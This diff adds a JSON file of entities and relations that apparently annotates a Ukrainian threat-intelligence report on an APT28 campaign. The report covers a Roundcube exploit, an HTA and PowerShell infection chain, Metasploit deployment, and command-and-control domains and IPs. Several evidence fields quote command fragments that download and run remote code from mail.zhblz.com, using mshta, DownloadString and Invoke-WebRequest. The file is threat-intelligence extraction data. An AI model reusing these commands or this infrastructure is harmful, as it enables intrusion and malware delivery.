@@ -1,0 +1,165 @@
+{
+  "entities": [
+    {
+      "name": "UAC-0001 (APT28)",
+      "kind": "hacking group",
+      "gloss": "A Russian state-sponsored cyber espionage group attributed to Russia's military intelligence service (GRU)."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country located in Eastern Europe."
+    },
+    {
+      "name": "Google",
+      "kind": "company",
+      "gloss": "A multinational technology company providing search engines, cloud computing, and online productivity tools."
+    },
+    {
+      "name": "reCAPTCHA",
+      "kind": "software product",
+      "gloss": "A security service by Google that protects websites from spam and abuse by distinguishing humans from automated bots."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework consisting of a command-line shell and scripting language developed by Microsoft."
+    },
+    {
+      "name": "browser.hta",
+      "kind": "file name",
+      "gloss": "A malicious HTML Application file executed during the infection chain."
+    },
+    {
+      "name": "Browser.ps1",
+      "kind": "file name",
+      "gloss": "A malicious PowerShell script used to establish SSH tunnels, exfiltrate browser data, and deploy Metasploit."
+    },
+    {
+      "name": "Chrome",
+      "kind": "software product",
+      "gloss": "A cross-platform web browser developed by Google."
+    },
+    {
+      "name": "Edge",
+      "kind": "software product",
+      "gloss": "A cross-platform web browser developed by Microsoft."
+    },
+    {
+      "name": "Opera",
+      "kind": "software product",
+      "gloss": "A multi-platform web browser developed by Opera Software."
+    },
+    {
+      "name": "Firefox",
+      "kind": "software product",
+      "gloss": "A free and open-source web browser developed by Mozilla."
+    },
+    {
+      "name": "METASPLOIT",
+      "kind": "security tool",
+      "gloss": "A computer security framework used for penetration testing and exploit development."
+    },
+    {
+      "name": "Roundcube",
+      "kind": "software product",
+      "gloss": "A free and open-source webmail software client written in PHP."
+    },
+    {
+      "name": "CVE-2023-43770",
+      "kind": "vulnerability identifier",
+      "gloss": "A cross-site scripting vulnerability in Roundcube webmail allowing attackers to steal sensitive user information."
+    },
+    {
+      "name": "ManageSiev",
+      "kind": "software plugin",
+      "gloss": "A plugin for Roundcube used to manage Sieve mail filtering rules."
+    },
+    {
+      "name": "zapit.exe",
+      "kind": "file name",
+      "gloss": "A malicious executable payload associated with Metasploit."
+    },
+    {
+      "name": "rdp.exe",
+      "kind": "file name",
+      "gloss": "A malicious executable file identified in the cyber attack."
+    },
+    {
+      "name": "mail.zhblz.com",
+      "kind": "internet domain",
+      "gloss": "A compromised command and control domain used to distribute malicious scripts and tools."
+    },
+    {
+      "name": "docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz.com",
+      "kind": "internet domain",
+      "gloss": "A malicious domain spoofing Google Spreadsheets used for phishing attacks."
+    },
+    {
+      "name": "doc.gmail.com.gyehddhrggdii323sdhnshiswh2udhqjwdhhfjcjeuejcj.zhblz.com",
+      "kind": "internet domain",
+      "gloss": "A malicious phishing domain masquerading as a Google service."
+    },
+    {
+      "name": "203.161.50.145",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the command and control domain mail.zhblz.com."
+    },
+    {
+      "name": "45.61.169.221",
+      "kind": "ip address",
+      "gloss": "A network infrastructure IP address utilized during the malicious campaign."
+    }
+  ],
+  "relations": [
+    {
+      "head": "CVE-2023-43770",
+      "type": "affects",
+      "tail": "Roundcube",
+      "evidence": "вразливості в Roundcube (CVE-2023-43770)"
+    },
+    {
+      "head": "ManageSiev",
+      "type": "part-of",
+      "tail": "Roundcube",
+      "evidence": "плагін \"ManageSiev\""
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "Browser.ps1",
+      "evidence": "DownloadString('https://mail.zhblz.com/B')"
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "browser.hta",
+      "evidence": "mshta https://mail.zhblz.com/b"
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "zapit.exe",
+      "evidence": "Invoke-WebRequest -Uri https://mail.zhblz.com/z -OutFile %APPDATA%\\zapit.exe"
+    },
+    {
+      "head": "UAC-0001 (APT28)",
+      "type": "uses-malware",
+      "tail": "METASPLOIT",
+      "evidence": "завантаження та запуск програмного засобу METASPLOIT"
+    },
+    {
+      "head": "UAC-0001 (APT28)",
+      "type": "exploits",
+      "tail": "CVE-2023-43770",
+      "evidence": "розповсюдженням електронних листів, що містили експлойт для вразливості в Roundcube (CVE-2023-43770)"
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "delivers",
+      "tail": "zapit.exe",
+      "evidence": "PowerShell-сценарію \"Browser.ps1\", основним призначенням якого є: завантаження та запуск програмного засобу METASPLOIT"
+    }
+  ],
+  "newRelationTypes": []
+}
